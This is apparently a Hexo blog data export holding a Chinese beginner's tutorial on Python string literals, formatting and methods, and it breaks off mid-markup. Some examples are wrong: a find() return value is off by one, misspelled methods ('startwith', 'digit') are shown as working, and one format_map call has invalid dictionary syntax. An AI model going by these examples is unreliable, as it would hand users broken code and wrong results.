#字母字符是否都是小写字母\n\tisupper()        #都是大写\n\t\t\n操作：\n\tjoin()     #将字符串作为分隔符，合并一个序列为一个字符串。\t\n\t\tPS：序列的元素要求是字符串才可以。\n\t\t\n\tsplit()    #以指定字符串为分隔符分割一个字符串为一个列表\t\n\treplace()  #对应替换\t\t\t\t\t\t\t\t\n\tstrip()    #脱掉字符串两端的指定字符串（默认脱空格）\t\t\n\t\n\tlower()    #将字符串中的字母字符变为小写\n\tupper()    #变大写\n\n编码：\n\t'abc'.encode('utf-8')\t\n```\n\n#### **字符串方法**\n\n#### C\n\n##### capitalize() #将字符串首字符大写\n\n```python\n'abc'.capitalize()   #返回'Abc'\n```\n\n- 若首字符是字母之外的则不做改变。\n\n##### center() #居中字符串并填充\n\n```python\n'abc'.center(50)      #居中字符串，不足50个字符用空格填充\n'abc'.center(50,'-')  #字符串不足50个字符时，用'-'在两边进行填充\n```\n\n- 数量为奇数时，优先填充右边。\n- ljust()为左对齐填充。\n- rjust()为右对齐填充。\n\n##### count() #返回字符或字符串在字符串中出现的次数\n\n```python\n'abcac'.count('a')     #返回2\n'abcacac'.count('ac')  #返回2\n```\n\n#### E\n\n##### encode() #对字符串进行编码\n\n```python\n'abc'.encode('utf-8')   #等同于b'abc',因为默认编码utf-8\n'abc'.encode('gb2312')\n```\n\n- 编码即将字符串以特定编码方式转为二进制。\n\n##### startwith()、endwith() #判断字符串开始与结尾\n\n```python\n'abc'.startwith('ab')  #返回True\n'abc'.endwith('bc')    #返回True\n```\n\n#### F\n\n##### find()、rfind() #查找字符串返回下标\n\n```python\n'abcd'.find('bc')    #返回2\n'abccd'.rfind('c')   #返回最右边c的下标3\n```\n\n- rfind()返回的是最右边匹配的字符串的下标。\n- 查找的字符串不存在时，返回-1\n\n##### format()、format_map()#字符串格式化\n\n```python\n'a{}c{}'.format('b','d')\n'a{name}c{age}'.format(name='b',age='d')\n'a{name}c{age}'.format_map({'name':'b','age':'d'})\n```\n\n#### I\n\n##### index() #返回字符或字符串在字符串中的下标\n\n```python\n'abc'.index('b')    #返回1\n```\n\n- 与find()区别在于，不存在字符串时会报错\n\n##### isalnum() #判断字符串是否是字母或数字组成\n\n```python\n'abc123'.isalnum()  #True\n'abc'.isalnum()     #True\n'123'.isalnum()     #True\n'abc\\n1'.isalnum()  #False\n'abc1.1'.isalnum()  #False\n```\n\n##### isalpha() #判断字符串是否是字母组成\n\n```python\n'aBc'.isalpha()    #True\n'aB2'.isalpha()    #False\n```\n\n##### isdecimal() #判断字符串是否是十进制数字\n\n```python\n'12'.isdecimal()   #True\n```\n\n##### isdigit() #判断字符串是否是数字组成\n\n```python\n'123'.digit()    #True\n'a1x2'.digit()   #False\n```\n\n##### islower() #字母字符是否都是小写字母\n\n```python\n'abc123'.islower()   #True\n'Aabc'.islower()     #False\n```\n\n- 字符串可以存在其他字符，只要字母字符是小写即可True.\n- isupper()与之相反，不在赘述\n\n##### isidentifier()#判断字符串可否符合变量名命名规则\n\n##### isnumeric() #字符串只包含数字字符\n\n##### isspace()#字符串只包含空格\n\n##### istitle()#字符串是否是标题化的\n\n```python\n'This Is Op'.istitle()   #True\n'this Is Op'.istitle()   #False\n```\n\n- title()用于将字符串标题化，即单词首字母大写\n\n#### J\n\n##### join()  #将一个序列以分隔符分割合并为一个字符串\n\n```python\n''.join(('a','b','c'))   #'abc'\n'_'.join(['a','b','c'])  #'a_b_c'\n```\n\n- 即以字符串为分隔符，将一个序列合并为一个字符串\n\n##### split() #以指定字符串为分隔符分割一个字符串为一个列表\n\n```python\n'abc'.split('b')       #['a','c']\n'a_b_c'.split('_')     #['a','b','c']\n'a_b_c'.split('_',1)   #['a','b_c']\n```\n\n- 第一个参数是分隔符，第二个参数是分割的次数\n- splitlines() #默认是以\\n、\\r、\\r\\n作为分隔符\n- rsplit()表示从右边开始进行分割\n\n#### L\n\n##### lower() #将字符串中的字母字符变为小写\n\n##### upper() #变大写\n\n#### M\n\n##### maketrans() #设置转换规则\n\n##### translate() #根据规则进行转换\n\n```python\nres=str.maketrans('abcd','1234')    #设置规则\n'abcd'.translate(res)     #'1234'\n'abcA'.translate(res)     #'123A'\n```\n\n#### R\n\n##### replace() #对应替换\n\n```python\n'abc'.replace('b','B')    #'aBc'\n```\n\n- 本质是产生了一个新的字符串，因为字符串时不可变对象\n\n#### S\n\n##### strip() #脱掉字符串两端的指定字符串\n\n```python\n'abc\\n'.strip()      #'abc'\n'abca'.strip('a')    #'bc'\n\na='abc'\na.strip('c')   #'ab'\nprint(a)       #'abc'\n```\n\n- 不指定字符串默认脱掉换行符、制表符等\n- 脱掉并返回脱掉后剩下的字符串\n- ==该操作不会对原字符串产生影响，因为字符串是不可变的。该操作只是产生一个新的字符串，原字符串仍然未变，效果就是字符串只是暂时脱掉而已==\n- lstrip()表示只脱掉最左端的\n- rstrip()表示只脱最右边的\n\n##### swapcase()#大小写翻转，大写变小写，小变大\n\n##### zfill()#右对齐，不足填0\n\n```python\n'abc'.zfill(5)    #'00abc'\n```\n\n\n\n\n\n","source":"_posts/01python基础学习系列之字符串.md","raw":"---\ntitle: Python基础学习系列Chapter 2：字符串\ndate: 2019-03-18 16:50:44\ntags:\n\t- Python基础\n\t- Language\ncategories: Python\n---\n\n### 0x00 字符串概述\n\n字符串是不可变的序列。\n\nPython3.0字符串分3中类型：str用于Unicode文本；bytes用于二进制文本；bytearray是bytes的变体。\n\n### 0x01 字符串\n\n#### 1.字符串常量：\n\n```python\n'string'\n\"string\"\n'''string'''\n\"\"\"string\"\"\"\nr'string'     #Raw字符串\nb'string'     #bytes字符串\n```\n\n<!-- more -->\n\n#### 2.字符串操作\n\n- 索引：`str[下标]`\n- 切片：`str[下标开始:下标结束：步长]`    #步长默认为1\n- 合并：`+`、`*`\n- 类型强制转换：`str()`\n- 修改字符串：可以通过产生新对象后重新赋值给原变量。\n\n#### 3.字符串格式化：\n\n```python\n\"this is %s\" %'collision'               #字符串形式\n\"%s is %s boy\"%(\"collision\",\"good\")     #元组形式\n\"%(x)d,%(y)d\"%{\"x\":1,\"y\":2}             #字典形式\n```\n\nformat格式化\n\n```python\n'a{}c{}'.format('b','d')\n'a{0}c{1}'.format('b','d')\n'a{name}c{age}'.format(name='b',age='d')\n'a{name}c{age}'.format_map({'name':'b','age'='d'})\n```\n\n### 0x02 字符串方法：\t\n\n```python\n查找：\n\tcount()          #返回字符或字符串在字符串中出现的次数\n\tfind()、rfind()  #查找字符或字符串返回第一次出现时的下标\n\tindex()          #返回字符或字符串在字符串中的下标\t\n\t\n\tPS:find()与index()区别在于，find对不存在的字符串查找会返回-1，而index会报错。\n\n判断：\n\tstartswith()、endswith()     #判断字符或字符串的开始与结尾\n\t\n\tisalpha()        #判断字符串是否是字母组成\t\n\tisnumeric()      #字符串只包含数字字符\t\n\tisalnum()        #判断字符串是否是字母或数字组\n\t\n\tisdecimal()      #判断字符串是否是十进制数字\n\tisdigit()        #判断字符串是否是数字组成\n\tislower()        #字母字符是否都是小写字母\n\tisupper()        #都是大写\n\t\t\n操作：\n\tjoin()     #将字符串作为分隔符，合并一个序列为一个字符串。\t\n\t\tPS：序列的元素要求是字符串才可以。\n\t\t\n\tsplit()    #以指定字符串为分隔符分割一个字符串为一个列表\t\n\treplace()  #对应替换\t\t\t\t\t\t\t\t\n\tstrip()    #脱掉字符串两端的指定字符串（默认脱空格）\t\t\n\t\n\tlower()    #将字符串中的字母字符变为小写\n\tupper()    #变大写\n\n编码：\n\t'abc'.encode('utf-8')\t\n```\n\n#### **字符串方法**\n\n#### C\n\n##### capitalize() #将字符串首字符大写\n\n```python\n'abc'.capitalize()   #返回'Abc'\n```\n\n- 若首字符是字母之外的则不做改变。\n\n##### center() #居中字符串并填充\n\n```python\n'abc'.center(50)      #居中字符串，不足50个字符用空格填充\n'abc'.center(50,'-')  #字符串不足50个字符时，用'-'在两边进行填充\n```\n\n- 数量为奇数时，优先填充右边。\n- ljust()为左对齐填充。\n- rjust()为右对齐填充。\n\n##### count() #返回字符或字符串在字符串中出现的次数\n\n```python\n'abcac'.count('a')     #返回2\n'abcacac'.count('ac')  #返回2\n```\n\n#### E\n\n##### encode() #对字符串进行编码\n\n```python\n'abc'.encode('utf-8')   #等同于b'abc',因为默认编码utf-8\n'abc'.encode('gb2312')\n```\n\n- 编码即将字符串以特定编码方式转为二进制。\n\n##### startwith()、endwith() #判断字符串开始与结尾\n\n```python\n'abc'.startwith('ab')  #返回True\n'abc'.endwith('bc')    #返回True\n```\n\n#### F\n\n##### find()、rfind() #查找字符串返回下标\n\n```python\n'abcd'.find('bc')    #返回2\n'abccd'.rfind('c')   #返回最右边c的下标3\n```\n\n- rfind()返回的是最右边匹配的字符串的下标。\n- 查找的字符串不存在时，返回-1\n\n##### format()、format_map()#字符串格式化\n\n```python\n'a{}c{}'.format('b','d')\n'a{name}c{age}'.format(name='b',age='d')\n'a{name}c{age}'.format_map({'name':'b','age':'d'})\n```\n\n#### I\n\n##### index() #返回字符或字符串在字符串中的下标\n\n```python\n'abc'.index('b')    #返回1\n```\n\n- 与find()区别在于，不存在字符串时会报错\n\n##### isalnum() #判断字符串是否是字母或数字组成\n\n```python\n'abc123'.isalnum()  #True\n'abc'.isalnum()     #True\n'123'.isalnum()     #True\n'abc\\n1'.isalnum()  #False\n'abc1.1'.isalnum()  #False\n```\n\n##### isalpha() #判断字符串是否是字母组成\n\n```python\n'aBc'.isalpha()    #True\n'aB2'.isalpha()    #False\n```\n\n##### isdecimal() #判断字符串是否是十进制数字\n\n```python\n'12'.isdecimal()   #True\n```\n\n##### isdigit() #判断字符串是否是数字组成\n\n```python\n'123'.digit()    #True\n'a1x2'.digit()   #False\n```\n\n##### islower() #字母字符是否都是小写字母\n\n```python\n'abc123'.islower()   #True\n'Aabc'.islower()     #False\n```\n\n- 字符串可以存在其他字符，只要字母字符是小写即可True.\n- isupper()与之相反，不在赘述\n\n##### isidentifier()#判断字符串可否符合变量名命名规则\n\n##### isnumeric() #字符串只包含数字字符\n\n##### isspace()#字符串只包含空格\n\n##### istitle()#字符串是否是标题化的\n\n```python\n'This Is Op'.istitle()   #True\n'this Is Op'.istitle()   #False\n```\n\n- title()用于将字符串标题化，即单词首字母大写\n\n#### J\n\n##### join()  #将一个序列以分隔符分割合并为一个字符串\n\n```python\n''.join(('a','b','c'))   #'abc'\n'_'.join(['a','b','c'])  #'a_b_c'\n```\n\n- 即以字符串为分隔符，将一个序列合并为一个字符串\n\n##### split() #以指定字符串为分隔符分割一个字符串为一个列表\n\n```python\n'abc'.split('b')       #['a','c']\n'a_b_c'.split('_')     #['a','b','c']\n'a_b_c'.split('_',1)   #['a','b_c']\n```\n\n- 第一个参数是分隔符，第二个参数是分割的次数\n- splitlines() #默认是以\\n、\\r、\\r\\n作为分隔符\n- rsplit()表示从右边开始进行分割\n\n#### L\n\n##### lower() #将字符串中的字母字符变为小写\n\n##### upper() #变大写\n\n#### M\n\n##### maketrans() #设置转换规则\n\n##### translate() #根据规则进行转换\n\n```python\nres=str.maketrans('abcd','1234')    #设置规则\n'abcd'.translate(res)     #'1234'\n'abcA'.translate(res)     #'123A'\n```\n\n#### R\n\n##### replace() #对应替换\n\n```python\n'abc'.replace('b','B')    #'aBc'\n```\n\n- 本质是产生了一个新的字符串，因为字符串时不可变对象\n\n#### S\n\n##### strip() #脱掉字符串两端的指定字符串\n\n```python\n'abc\\n'.strip()      #'abc'\n'abca'.strip('a')    #'bc'\n\na='abc'\na.strip('c')   #'ab'\nprint(a)       #'abc'\n```\n\n- 不指定字符串默认脱掉换行符、制表符等\n- 脱掉并返回脱掉后剩下的字符串\n- ==该操作不会对原字符串产生影响，因为字符串是不可变的。该操作只是产生一个新的字符串，原字符串仍然未变，效果就是字符串只是暂时脱掉而已==\n- lstrip()表示只脱掉最左端的\n- rstrip()表示只脱最右边的\n\n##### swapcase()#大小写翻转，大写变小写，小变大\n\n##### zfill()#右对齐，不足填0\n\n```python\n'abc'.zfill(5)    #'00abc'\n```\n\n\n\n\n\n","slug":"01python基础学习系列之字符串","published":1,"updated":"2019-03-29T07:21:27.961Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83iv00077or0hdzbq3lg","content":"<h3 id=\"0x00-字符串概述\"><a href=\"#0x00-字符串概述\" class=\"headerlink\" title=\"0x00 字符串概述\"></a>0x00 字符串概述</h3><p>字符串是不可变的序列。</p>\n<p>Python3.0字符串分3中类型：str用于Unicode文本；bytes用于二进制文本；bytearray是bytes的变体。</p>\n<h3 id=\"0x01-字符串\"><a href=\"#0x01-字符串\" class=\"headerlink\" title=\"0x01 字符串\"></a>0x01 字符串</h3><h4 id=\"1-字符串常量：\"><a href=\"#1-字符串常量：\" class=\"headerlink\" title=\"1.字符串常量：\"></a>1.字符串常量：</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'string'</span></span><br><span class=\"line\"><span class=\"string\">\"string\"</span></span><br><span class=\"line\"><span class=\"string\">'''string'''</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"string\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">r'string'</span>     <span class=\"comment\">#Raw字符串</span></span><br><span class=\"line\"><span class=\"string\">b'string'</span>     <span class=\"comment\">#bytes字符串</span></span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h4 id=\"2-字符串操作\"><a href=\"#2-字符串操作\" class=\"headerlink\" title=\"2.字符串操作\"></a>2.字符串操作</h4><ul>\n<li>索引：<code>str[下标]</code></li>\n<li>切片：<code>str[下标开始:下标结束：步长]</code>    #步长默认为1</li>\n<li>合并：<code>+</code>、<code>*</code></li>\n<li>类型强制转换：<code>str()</code></li>\n<li>修改字符串：可以通过产生新对象后重新赋值给原变量。</li>\n</ul>\n<h4 id=\"3-字符串格式化：\"><a href=\"#3-字符串格式化：\" class=\"headerlink\" title=\"3.字符串格式化：\"></a>3.字符串格式化：</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">\"this is %s\"</span> %<span class=\"string\">'collision'</span>               <span class=\"comment\">#字符串形式</span></span><br><span class=\"line\"><span class=\"string\">\"%s is %s boy\"</span>%(<span class=\"string\">\"collision\"</span>,<span class=\"string\">\"good\"</span>)     <span class=\"comment\">#元组形式</span></span><br><span class=\"line\"><span class=\"string\">\"%(x)d,%(y)d\"</span>%&#123;<span class=\"string\">\"x\"</span>:<span class=\"number\">1</span>,<span class=\"string\">\"y\"</span>:<span class=\"number\">2</span>&#125;             <span class=\"comment\">#字典形式</span></span><br></pre></td></tr></table></figure>\n<p>format格式化</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'a&#123;&#125;c&#123;&#125;'</span>.format(<span class=\"string\">'b'</span>,<span class=\"string\">'d'</span>)</span><br><span class=\"line\"><span class=\"string\">'a&#123;0&#125;c&#123;1&#125;'</span>.format(<span class=\"string\">'b'</span>,<span class=\"string\">'d'</span>)</span><br><span class=\"line\"><span class=\"string\">'a&#123;name&#125;c&#123;age&#125;'</span>.format(name=<span class=\"string\">'b'</span>,age=<span class=\"string\">'d'</span>)</span><br><span class=\"line\"><span class=\"string\">'a&#123;name&#125;c&#123;age&#125;'</span>.format_map(&#123;<span class=\"string\">'name'</span>:<span class=\"string\">'b'</span>,<span class=\"string\">'age'</span>=<span class=\"string\">'d'</span>&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"0x02-字符串方法：\"><a href=\"#0x02-字符串方法：\" class=\"headerlink\" title=\"0x02 字符串方法：\"></a>0x02 字符串方法：</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查找：</span><br><span class=\"line\">\tcount()          <span class=\"comment\">#返回字符或字符串在字符串中出现的次数</span></span><br><span class=\"line\">\tfind()、rfind()  <span class=\"comment\">#查找字符或字符串返回第一次出现时的下标</span></span><br><span class=\"line\">\tindex()          <span class=\"comment\">#返回字符或字符串在字符串中的下标\t</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tPS:find()与index()区别在于，find对不存在的字符串查找会返回<span class=\"number\">-1</span>，而index会报错。</span><br><span class=\"line\"></span><br><span class=\"line\">判断：</span><br><span class=\"line\">\tstartswith()、endswith()     <span class=\"comment\">#判断字符或字符串的开始与结尾</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tisalpha()        <span class=\"comment\">#判断字符串是否是字母组成\t</span></span><br><span class=\"line\">\tisnumeric()      <span class=\"comment\">#字符串只包含数字字符\t</span></span><br><span class=\"line\">\tisalnum()        <span class=\"comment\">#判断字符串是否是字母或数字组</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tisdecimal()      <span class=\"comment\">#判断字符串是否是十进制数字</span></span><br><span class=\"line\">\tisdigit()        <span class=\"comment\">#判断字符串是否是数字组成</span></span><br><span class=\"line\">\tislower()        <span class=\"comment\">#字母字符是否都是小写字母</span></span><br><span class=\"line\">\tisupper()        <span class=\"comment\">#都是大写</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\">操作：</span><br><span class=\"line\">\tjoin()     <span class=\"comment\">#将字符串作为分隔符，合并一个序列为一个字符串。\t</span></span><br><span class=\"line\">\t\tPS：序列的元素要求是字符串才可以。</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\tsplit()    <span class=\"comment\">#以指定字符串为分隔符分割一个字符串为一个列表\t</span></span><br><span class=\"line\">\treplace()  <span class=\"comment\">#对应替换\t\t\t\t\t\t\t\t</span></span><br><span class=\"line\">\tstrip()    <span class=\"comment\">#脱掉字符串两端的指定字符串（默认脱空格）\t\t</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tlower()    <span class=\"comment\">#将字符串中的字母字符变为小写</span></span><br><span class=\"line\">\tupper()    <span class=\"comment\">#变大写</span></span><br><span class=\"line\"></span><br><span class=\"line\">编码：</span><br><span class=\"line\">\t<span class=\"string\">'abc'</span>.encode(<span class=\"string\">'utf-8'</span>)</span><br></pre></td></tr></table></figure>\n<h4 id=\"字符串方法\"><a href=\"#字符串方法\" class=\"headerlink\" title=\"字符串方法\"></a><strong>字符串方法</strong></h4><h4 id=\"C\"><a href=\"#C\" class=\"headerlink\" title=\"C\"></a>C</h4><h5 id=\"capitalize-将字符串首字符大写\"><a href=\"#capitalize-将字符串首字符大写\" class=\"headerlink\" title=\"capitalize() #将字符串首字符大写\"></a>capitalize() #将字符串首字符大写</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc'</span>.capitalize()   <span class=\"comment\">#返回'Abc'</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>若首字符是字母之外的则不做改变。</li>\n</ul>\n<h5 id=\"center-居中字符串并填充\"><a href=\"#center-居中字符串并填充\" class=\"headerlink\" title=\"center() #居中字符串并填充\"></a>center() #居中字符串并填充</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc'</span>.center(<span class=\"number\">50</span>)      <span class=\"comment\">#居中字符串，不足50个字符用空格填充</span></span><br><span class=\"line\"><span class=\"string\">'abc'</span>.center(<span class=\"number\">50</span>,<span class=\"string\">'-'</span>)  <span class=\"comment\">#字符串不足50个字符时，用'-'在两边进行填充</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>数量为奇数时，优先填充右边。</li>\n<li>ljust()为左对齐填充。</li>\n<li>rjust()为右对齐填充。</li>\n</ul>\n<h5 id=\"count-返回字符或字符串在字符串中出现的次数\"><a href=\"#count-返回字符或字符串在字符串中出现的次数\" class=\"headerlink\" title=\"count() #返回字符或字符串在字符串中出现的次数\"></a>count() #返回字符或字符串在字符串中出现的次数</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abcac'</span>.count(<span class=\"string\">'a'</span>)     <span class=\"comment\">#返回2</span></span><br><span class=\"line\"><span class=\"string\">'abcacac'</span>.count(<span class=\"string\">'ac'</span>)  <span class=\"comment\">#返回2</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"E\"><a href=\"#E\" class=\"headerlink\" title=\"E\"></a>E</h4><h5 id=\"encode-对字符串进行编码\"><a href=\"#encode-对字符串进行编码\" class=\"headerlink\" title=\"encode() #对字符串进行编码\"></a>encode() #对字符串进行编码</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc'</span>.encode(<span class=\"string\">'utf-8'</span>)   <span class=\"comment\">#等同于b'abc',因为默认编码utf-8</span></span><br><span class=\"line\"><span class=\"string\">'abc'</span>.encode(<span class=\"string\">'gb2312'</span>)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>编码即将字符串以特定编码方式转为二进制。</li>\n</ul>\n<h5 id=\"startwith-、endwith-判断字符串开始与结尾\"><a href=\"#startwith-、endwith-判断字符串开始与结尾\" class=\"headerlink\" title=\"startwith()、endwith() #判断字符串开始与结尾\"></a>startwith()、endwith() #判断字符串开始与结尾</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc'</span>.startwith(<span class=\"string\">'ab'</span>)  <span class=\"comment\">#返回True</span></span><br><span class=\"line\"><span class=\"string\">'abc'</span>.endwith(<span class=\"string\">'bc'</span>)    <span class=\"comment\">#返回True</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"F\"><a href=\"#F\" class=\"headerlink\" title=\"F\"></a>F</h4><h5 id=\"find-、rfind-查找字符串返回下标\"><a href=\"#find-、rfind-查找字符串返回下标\" class=\"headerlink\" title=\"find()、rfind() #查找字符串返回下标\"></a>find()、rfind() #查找字符串返回下标</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abcd'</span>.find(<span class=\"string\">'bc'</span>)    <span class=\"comment\">#返回2</span></span><br><span class=\"line\"><span class=\"string\">'abccd'</span>.rfind(<span class=\"string\">'c'</span>)   <span class=\"comment\">#返回最右边c的下标3</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>rfind()返回的是最右边匹配的字符串的下标。</li>\n<li>查找的字符串不存在时，返回-1</li>\n</ul>\n<h5 id=\"format-、format-map-字符串格式化\"><a href=\"#format-、format-map-字符串格式化\" class=\"headerlink\" title=\"format()、format_map()#字符串格式化\"></a>format()、format_map()#字符串格式化</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'a&#123;&#125;c&#123;&#125;'</span>.format(<span class=\"string\">'b'</span>,<span class=\"string\">'d'</span>)</span><br><span class=\"line\"><span class=\"string\">'a&#123;name&#125;c&#123;age&#125;'</span>.format(name=<span class=\"string\">'b'</span>,age=<span class=\"string\">'d'</span>)</span><br><span class=\"line\"><span class=\"string\">'a&#123;name&#125;c&#123;age&#125;'</span>.format_map(&#123;<span class=\"string\">'name'</span>:<span class=\"string\">'b'</span>,<span class=\"string\">'age'</span>:<span class=\"string\">'d'</span>&#125;)</span><br></pre></td></tr></table></figure>\n<h4 id=\"I\"><a href=\"#I\" class=\"headerlink\" title=\"I\"></a>I</h4><h5 id=\"index-返回字符或字符串在字符串中的下标\"><a href=\"#index-返回字符或字符串在字符串中的下标\" class=\"headerlink\" title=\"index() #返回字符或字符串在字符串中的下标\"></a>index() #返回字符或字符串在字符串中的下标</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc'</span>.index(<span class=\"string\">'b'</span>)    <span class=\"comment\">#返回1</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>与find()区别在于，不存在字符串时会报错</li>\n</ul>\n<h5 id=\"isalnum-判断字符串是否是字母或数字组成\"><a href=\"#isalnum-判断字符串是否是字母或数字组成\" class=\"headerlink\" title=\"isalnum() #判断字符串是否是字母或数字组成\"></a>isalnum() #判断字符串是否是字母或数字组成</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc123'</span>.isalnum()  <span class=\"comment\">#True</span></span><br><span class=\"line\"><span class=\"string\">'abc'</span>.isalnum()     <span class=\"comment\">#True</span></span><br><span class=\"line\"><span class=\"string\">'123'</span>.isalnum()     <span class=\"comment\">#True</span></span><br><span class=\"line\"><span class=\"string\">'abc\\n1'</span>.isalnum()  <span class=\"comment\">#False</span></span><br><span class=\"line\"><span class=\"string\">'abc1.1'</span>.isalnum()  <span class=\"comment\">#False</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"isalpha-判断字符串是否是字母组成\"><a href=\"#isalpha-判断字符串是否是字母组成\" class=\"headerlink\" title=\"isalpha() #判断字符串是否是字母组成\"></a>isalpha() #判断字符串是否是字母组成</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'aBc'</span>.isalpha()    <span class=\"comment\">#True</span></span><br><span class=\"line\"><span class=\"string\">'aB2'</span>.isalpha()    <span class=\"comment\">#False</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"isdecimal-判断字符串是否是十进制数字\"><a href=\"#isdecimal-判断字符串是否是十进制数字\" class=\"headerlink\" title=\"isdecimal() #判断字符串是否是十进制数字\"></a>isdecimal() #判断字符串是否是十进制数字</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'12'</span>.isdecimal()   <span class=\"comment\">#True</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"isdigit-判断字符串是否是数字组成\"><a href=\"#isdigit-判断字符串是否是数字组成\" class=\"headerlink\" title=\"isdigit() #判断字符串是否是数字组成\"></a>isdigit() #判断字符串是否是数字组成</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'123'</span>.digit()    <span class=\"comment\">#True</span></span><br><span class=\"line\"><span class=\"string\">'a1x2'</span>.digit()   <span class=\"comment\">#False</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"islower-字母字符是否都是小写字母\"><a href=\"#islower-字母字符是否都是小写字母\" class=\"headerlink\" title=\"islower() #字母字符是否都是小写字母\"></a>islower() #字母字符是否都是小写字母</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc123'</span>.islower()   <span class=\"comment\">#True</span></span><br><span class=\"line\"><span class=\"string\">'Aabc'</span>.islower()     <span class=\"comment\">#False</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>字符串可以存在其他字符，只要字母字符是小写即可True.</li>\n<li>isupper()与之相反，不在赘述</li>\n</ul>\n<h5 id=\"isidentifier-判断字符串可否符合变量名命名规则\"><a href=\"#isidentifier-判断字符串可否符合变量名命名规则\" class=\"headerlink\" title=\"isidentifier()#判断字符串可否符合变量名命名规则\"></a>isidentifier()#判断字符串可否符合变量名命名规则</h5><h5 id=\"isnumeric-字符串只包含数字字符\"><a href=\"#isnumeric-字符串只包含数字字符\" class=\"headerlink\" title=\"isnumeric() #字符串只包含数字字符\"></a>isnumeric() #字符串只包含数字字符</h5><h5 id=\"isspace-字符串只包含空格\"><a 